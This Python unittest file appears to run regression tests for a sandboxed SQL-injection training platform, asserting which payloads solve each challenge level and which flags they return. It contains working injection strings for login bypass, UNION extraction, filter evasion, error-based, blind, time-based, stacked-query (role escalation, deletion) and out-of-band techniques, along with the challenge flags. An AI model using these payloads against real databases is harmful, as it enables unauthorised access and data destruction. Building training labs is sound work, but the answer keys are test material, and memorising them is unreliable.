from __future__ import annotations

import sys
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from app import create_app  # noqa: E402
from app.services.sql_sandbox import SandboxRuntimeError, execute_sql_sandbox  # noqa: E402


UNION_CATEGORY_CHAR = "CHAR(117,110,105,111,110,45,98,97,115,101,100)"
OUT_OF_BAND_CHAR = "CHAR(111,117,116,45,111,102,45,98,97,110,100)"


class ChallengeRegressionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.app = create_app()
        cls.client = cls.app.test_client()

    def simulate(self, challenge_id: str, inputs: dict[str, str], user_id: str = "regression") -> dict:
        response = self.client.post(
            f"/api/challenges/{challenge_id}/simulate",
            json={"inputs": inputs, "user_id": user_id},
        )
        self.assertEqual(response.status_code, 200, challenge_id)
        payload = response.get_json()
        self.assertIn("result", payload, challenge_id)
        return payload["result"]

    def assertSolved(self, challenge_id: str, inputs: dict[str, str], flag: str | None = None) -> None:
        result = self.simulate(challenge_id, inputs)
        self.assertTrue(result["solved"], f"{challenge_id} should solve, got: {result}")
        if flag:
            self.assertEqual(result["flag"], flag, challenge_id)

    def test_login_path(self) -> None:
        cases = {
            "login-bypass-l1": {"username": "' OR 1=1 --", "password": "x"},
            "login-bypass-l2": {"username": "'||1=1#", "password": "x"},
            "login-bypass-l3": {"username": "'||1 IN(1)#", "password": "x"},
            "login-bypass-l4": {"username": "'||1 IN(1)#", "password": "x"},
            "login-bypass-l5": {"username": "'||1 IN(1)#", "password": "x"},
            "login-bypass-l6": {"username": "'||1 IN(1)#", "password": "x"},
            "login-bypass-l7": {"username": "'||1 IN(1)#", "password": "x"},
            "login-bypass-l8": {"username": "%27%7C%7C1%20IN(1)%23", "password": "x"},
        }
        for challenge_id, inputs in cases.items():
            with self.subTest(challenge_id=challenge_id):
                self.assertSolved(challenge_id, inputs, "HCSC{login_admin_console}")

    def test_sql_shape_validation(self) -> None:
        with self.assertRaises(SandboxRuntimeError) as union_error:
            execute_sql_sandbox("SELECT id, name, price FROM products WHERE id = '1' UNION SELECT 1,2,3,4,5,6,7")
        self.assertEqual(str(union_error.exception), "The used SELECT statements have a different number of columns")
        self.assertEqual(union_error.exception.code, "1222")

        with self.assertRaises(SandboxRuntimeError) as order_error:
            execute_sql_sandbox("SELECT id, name, price FROM products WHERE id = '1' ORDER BY 8")
        self.assertEqual(str(order_error.exception), "Unknown column '8' in 'order clause'")
        self.assertEqual(order_error.exception.code, "1054")

    def test_union_path(self) -> None:
        cases = {
            "union-based-l1": {"payload": "' UNION SELECT id,label,flag FROM flags WHERE category='union-based'--"},
            "union-based-l2": {"payload": f"%27 UNION SELECT id,label,flag FROM flags WHERE category={UNION_CATEGORY_CHAR}#"},
            "union-based-l3": {"payload": "' UNION SEL/**/ECT id,label,flag FROM flags WHERE category='union-based'--"},
            "union-based-l4": {"payload": f"%27 UNION%0bSELECT id,label,flag FROM flags WHERE category={UNION_CATEGORY_CHAR}#"},
            "union-based-l5": {"payload": f"%2527 UNION ALL SELECT id,label,flag FROM flags WHERE category={UNION_CATEGORY_CHAR}#"},
        }
        for challenge_id, inputs in cases.items():
            with self.subTest(challenge_id=challenge_id):
                self.assertSolved(challenge_id, inputs, "HCSC{union_flags_dump}")

    def test_error_boolean_time_stacked_paths(self) -> None:
        cases = {
            "error-based-l1": (
                {"payload": "' AND updatexml(1,concat(':',(SELECT flag FROM flags WHERE category='error-based')),1)--"},
                "HCSC{error_message_leak}",
            ),
            "error-based-l2": (
                {"payload": "' AND extractvalue(1,concat(':',(SELECT flag FROM flags WHERE category='error-based')))--"},
                "HCSC{error_message_leak}",
            ),
            "error-based-l3": (
                {"payload": "' OR CAST((SELECT flag FROM flags WHERE category='error-based') AS INTEGER)--"},
                "HCSC{error_message_leak}",
            ),
            "boolean-blind-l1": (
                {
                    "payload": "' OR (SUBSTR((SELECT flag FROM flags WHERE category='boolean-blind'),1,1)='H' AND (SELECT flag FROM flags WHERE category='boolean-blind')='HCSC{boolean_blind_truth}')--"
                },
                "HCSC{boolean_blind_truth}",
            ),
            "boolean-blind-l2": (
                {
                    "payload": "' OR LENGTH((SELECT flag FROM flags WHERE category='boolean-blind'))=25 AND (SELECT flag FROM flags WHERE category='boolean-blind')='HCSC{boolean_blind_truth}'--"
                },
                "HCSC{boolean_blind_truth}",
            ),
            "boolean-blind-l3": (
                {
                    "payload": "' OR id>0 AND (SELECT flag FROM flags WHERE category='boolean-blind')='HCSC{boolean_blind_truth}'--"
                },
                "HCSC{boolean_blind_truth}",
            ),
            "time-based-l1": (
                {
                    "payload": "' OR IF((SELECT flag FROM flags WHERE category='time-based')='HCSC{time_delay_inference}',SLEEP(1),0)--"
                },
                "HCSC{time_delay_inference}",
            ),
            "time-based-l2": (
                {
                    "payload": "' OR CASE WHEN LENGTH((SELECT flag FROM flags WHERE category='time-based'))=26 AND (SELECT flag FROM flags WHERE category='time-based')='HCSC{time_delay_inference}' THEN SLEEP(1) ELSE 0 END--"
                },
                "HCSC{time_delay_inference}",
            ),
            "time-based-l3": (
                {
                    "payload": "' OR IF((SELECT id FROM flags WHERE category='time-based')>0 AND (SELECT flag FROM flags WHERE category='time-based')='HCSC{time_delay_inference}',SLEEP(1),0)--"
                },
                "HCSC{time_delay_inference}",
            ),
            "stacked-query-l1": (
                {"payload": "'; INSERT INTO logs(action) VALUES('stacked'); SELECT id,label,flag FROM flags WHERE category='stacked-query'--"},
                "HCSC{stacked_query_chain}",
            ),
            "stacked-query-l2": (
                {"payload": "'; UPDATE users SET role='db_admin' WHERE username='admin'; SELECT id,label,flag FROM flags WHERE category='stacked-query'--"},
                "HCSC{stacked_query_chain}",
            ),
            "stacked-query-l3": (
                {"payload": "'; DELETE FROM orders WHERE id>0; SELECT id,label,flag FROM flags WHERE category='stacked-query'--"},
                "HCSC{stacked_query_chain}",
            ),
        }
        for challenge_id, (inputs, flag) in cases.items():
            with self.subTest(challenge_id=challenge_id):
                self.assertSolved(challenge_id, inputs, flag)

    def test_oob_path(self) -> None:
        cases = {
            "out-of-band-l1": {
                "payload": "' OR dns_lookup((SELECT flag FROM flags WHERE category='out-of-band'))#",
            },
            "out-of-band-l2": {
                "payload": f"%27 OR http_get((SELECT flag FROM flags WHERE category={OUT_OF_BAND_CHAR}))#",
            },
            "out-of-band-l3": {
                "payload": f"admin%2527%09AND%09dns_lookup((%2553ELECT flag FROM flags WHERE category={OUT_OF_BAND_CHAR}))=0#",
            },
        }
        for challenge_id, inputs in cases.items():
            with self.subTest(challenge_id=challenge_id):
                self.assertSolved(challenge_id, inputs, "HCSC{oob_callback_master}")

    def test_second_order_path(self) -> None:
        cases = {
            "second-order-classic-l1": {"stored_value": "admins' OR 1=1--", "trigger_action": "render-profile"},
            "second-order-classic-l2": {"stored_value": "shipped' OR 1=1--", "trigger_action": "export-invoice"},
            "second-order-classic-l3": {"stored_value": "' UNION SELECT id,audience,message,flag FROM hidden_messages--", "trigger_action": "admin-audit"},
            "second-order-classic-l4": {"stored_value": "'; SELECT id,owner,title,flag FROM admin_notes--", "trigger_action": "batch-resume"},
        }
        for challenge_id, inputs in cases.items():
            with self.subTest(challenge_id=challenge_id):
                self.assertSolved(challenge_id, inputs, "HCSC{second_order_delayed_flag}")


if __name__ == "__main__":
    unittest.main()
